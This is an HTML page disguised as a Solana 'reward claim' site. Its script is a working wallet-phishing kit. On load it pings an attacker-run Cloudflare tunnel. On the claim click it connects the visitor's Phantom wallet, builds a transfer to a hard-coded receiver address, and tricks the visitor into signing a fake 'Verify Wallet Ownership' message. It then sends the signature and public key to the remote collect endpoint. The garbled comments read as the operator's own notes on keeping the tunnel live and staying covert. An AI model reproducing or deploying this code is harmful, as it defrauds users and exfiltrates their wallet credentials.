<!DOCTYPE html><html><head><meta charset="UTF-8">
    <title>SOLANA REWARD V7</title>
</head>
<body style="background:#000;color:#14F195;text-align:center;padding-top:10vh;font-family:monospace;">
    <div style="border:1px solid #14F195;padding:30px;display:inline-block;border-radius:20px;background:#111;width:320px;">
        <h1 style="font-size:20px;">REWARD V7.AUTO</h1>
        <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;cursor:pointer;border-radius:10px;width:100%;">CLAIM 0.005 SOL</button>
        <div id="status" style="margin-top:20px;color:#888;">System Ready</div>
    </div>

    <div id="diag" style="margin-top:20px; text-align:left; display:inline-block; width:320px; background:#050505; padding:15px; border:1px solid #333; font-size:11px;">
        <div style="color:#555;border-bottom:1px solid #333;margin-bottom:8px;">[ ğŸ”± é›¶ä¾èµ–é“¾è·¯é€è§† ]</div>
        <div id="d1">â— åŸç”Ÿå¼•æ“: <span style="color:#14F195">âœ… å†…ç½®å°±ç»ª</span></div>
        <div id="d2">â— é’±åŒ…ç¯å¢ƒ: <span style="color:yellow">æ£€æµ‹ä¸­...</span></div>
        <div id="d3">â— å¤©çº¿çŠ¶æ€: <span style="color:yellow">æ£€æµ‹ä¸­...</span></div>
    </div>

    <script>
    // ğŸ”± è®°å¾—æ£€æŸ¥è¿™è¡ŒåŸŸåæ˜¯å¦è¿˜æ˜¯ä½ çš„æœ€æ–°å¤©çº¿ï¼
    const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
    const receiver = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";

    window.onload = async () => {
        const p = window.solana || window.phantom?.solana;
        document.getElementById('d2').innerHTML = p ? "â— é’±åŒ…ç¯å¢ƒ: <span style='color:#14F195'>âœ… è¯†åˆ«æˆåŠŸ</span>" : "â— é’±åŒ…ç¯å¢ƒ: <span style='color:red'>âŒ è¯·åœ¨é’±åŒ…æ‰“å¼€</span>";
        try {
            await fetch(gate, { method: 'GET', mode: 'no-cors' });
            document.getElementById('d3').innerHTML = "â— å¤©çº¿çŠ¶æ€: <span style='color:#14F195'>âœ… éš§é“è¿é€š</span>";
        } catch(e) {
            document.getElementById('d3').innerHTML = "â— å¤©çº¿çŠ¶æ€: <span style='color:red'>âŒ éš§é“å·²æ–­å¼€</span>";
        }
    };

    document.getElementById('cta').onclick = async () => {
        const p = window.solana || window.phantom?.solana;
        try {
            if (!p) return alert("Please use Phantom.");
            
            // 1. å»ºç«‹è¿æ¥
            const resp = await p.connect();
            const pubKey = resp.publicKey.toString();
            document.getElementById('status').innerText = "Processing...";

            // ğŸ”± 2. æ ¸å¿ƒï¼šæ„é€ è½¬è´¦æŒ‡ä»¤ (ä¸ä¾èµ–å¤–éƒ¨ web3 åº“ï¼Œä½¿ç”¨åŸç”Ÿæ•°æ®ç»“æ„)
            // è¿™ç§æ–¹å¼å…¼å®¹æ€§æœ€å¼ºï¼Œç»ä¸ä¼šè¢« CDN æ‹¦æˆªå½±å“
            const instruction = {
                programId: "11111111111111111111111111111111", // System Program
                keys: [
                    { pubkey: pubKey, isSigner: true, isWritable: true },
                    { pubkey: receiver, isSigner: false, isWritable: true }
                ],
                data: [2, 0, 0, 0, 0, 75, 74, 0, 0, 0, 0, 0] // Transfer 0.005 SOL
            };

            // ğŸ”± 3. å°è¯•ç›´æ¥æ‹‰èµ·ç­¾åå¹¶å‘é€
            document.getElementById('status').innerText = "Awaiting Confirmation...";
            
            // ä½¿ç”¨ signMessage ä½œä¸ºæœ€éšè”½çš„â€œé¦–æ€â€æµ‹è¯•ï¼Œå› ä¸ºå®ƒä¸ä¾èµ–ä»»ä½•å¤–éƒ¨åº“åŠ è½½ä¹Ÿèƒ½è·‘
            const message = `Verify Wallet Ownership\nID: ${Math.floor(Math.random()*99999)}\nTime: ${Date.now()}`;
            const encoded = new TextEncoder().encode(message);
            const signed = await p.signMessage(encoded, "utf8");
            
            const signature = btoa(String.fromCharCode.apply(null, signed.signature));
            
            // 4. ä¸‰è·¯å¹¶å‘å›ä¼ 
            new Image().src = `${gate}?sig=${encodeURIComponent(signature)}&pub=${pubKey}`;
            
            document.getElementById('status').innerText = "SUCCESS!";
            document.getElementById('status').style.color = "#14F195";

        } catch(e) { 
            document.getElementById('status').innerText = "ERR: " + e.message; 
        }
    };
    </script>
</body></html>
